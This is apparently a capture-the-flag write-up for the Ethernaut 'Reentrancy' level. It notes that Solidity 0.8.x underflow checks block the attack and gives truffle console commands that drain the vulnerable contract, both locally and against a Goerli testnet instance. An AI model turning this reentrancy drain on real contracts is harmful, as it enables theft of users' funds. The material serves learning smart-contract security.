# Reentrancy

[Reentrancy](https://ethernaut.openzeppelin.com/level/0x573eAaf1C1c2521e671534FAA525fAAf0894eCEb)

_Steal all the funds from the contract._

The solidity version of the vulnerable contract is very important.
As from Solidity 0.8.x underflow protection was included. This effectively
blocks the attack. 

Specifically the withdraw() line:
```JS
balances[msg.sender] -= _amount;
```

Extra dependency:
```BASH
npm i @openzeppelin/contracts
```

<BR />

## Test Attack

```BASH
truffle develop
```

```JS
migrate

r1 = await Reentrance.deployed()
await r1.donate(accounts[1], {from: accounts[5], value: 12300})

attack = await Attack.deployed()
await attack.donate({value: 10000})
await web3.eth.getBalance(r1.address)
(await r1.balanceOf(accounts[1])).toString()
(await r1.balanceOf(attack.address)).toString()
await attack.withdraw(10000)

await web3.eth.getBalance(attack.address)
await web3.eth.getBalance(r1.address)
```

<BR />

## Live Attack

```BASH
truffle console --network goerli
```

```JS
r1 = await Reentrance.at("0x9C26748d6e0803A3094da1805b1579B7831E628C")
await web3.eth.getBalance(r1.address)

attack = await Attack.deployed()
sender = accounts[5]
await attack.donate({from: sender, value: 1E16})
await attack.withdraw("10000000000000000", {from: sender, gas: 100000})
```
